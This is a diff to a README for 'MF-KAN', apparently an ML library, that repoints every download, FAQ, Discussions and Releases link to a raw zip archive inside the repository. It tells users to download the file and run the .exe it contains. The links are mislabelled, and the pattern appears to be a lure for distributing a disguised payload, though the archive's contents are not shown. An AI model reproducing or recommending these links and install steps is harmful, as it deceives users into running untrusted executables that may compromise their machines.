@@ -1,6 +1,6 @@
 # 🚀 MF-KAN - Efficient Learning with Minimal Data
 
-[![Download MF-KAN](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip)](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip)
+[![Download MF-KAN](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip)](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip)
 
 ## 🌟 Overview
 
@@ -12,11 +12,11 @@ To get started with MF-KAN, you need to download the latest version from our Rel
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip) to find the latest version of MF-KAN.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip) to find the latest version of MF-KAN.
 2. **Choose Your File**: Look for the file that is compatible with your system:
    - For Windows, select the `.exe` file.
    - For Mac, choose the `.dmg` file.
-   - For Linux, you may find a `https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip` file.
+   - For Linux, you may find a `https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip` file.
 3. **Download the File**: Click on the file to start the download.
 4. **Run the Installer**: 
    - On Windows, double-click the downloaded `.exe` file.
@@ -61,11 +61,11 @@ If you encounter any issues while using MF-KAN, consider the following suggestio
 
 - **Check the Installation**: Ensure that the installation completed without errors.
 - **Update Your Data**: Make sure your datasets are correctly formatted and clean.
-- **Consult the FAQ**: Visit our [FAQ section](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip) for common issues.
+- **Consult the FAQ**: Visit our [FAQ section](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip) for common issues.
 
 ## 🤝 Community Support
 
-We welcome feedback and questions from users. If you need help or want to share your experiences, join our community on [GitHub Discussions](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip). 
+We welcome feedback and questions from users. If you need help or want to share your experiences, join our community on [GitHub Discussions](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip). 
 
 ## 📜 License
 
@@ -83,6 +83,6 @@ For those interested in learning more about the concepts behind MF-KAN, we recom
 
 ## 📢 Keep Updated
 
-For the latest features and updates, be sure to check our [Releases page](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/utils/M_KAN_1.9.zip) regularly. 
+For the latest features and updates, be sure to check our [Releases page](https://raw.githubusercontent.com/Marco-A93/MF-KAN/main/mfkan/KAN_M_3.3.zip) regularly. 
 
 We are committed to continuous improvement and appreciate any contributions or suggestions you may have. Thank you for choosing MF-KAN for your data-efficient learning needs!
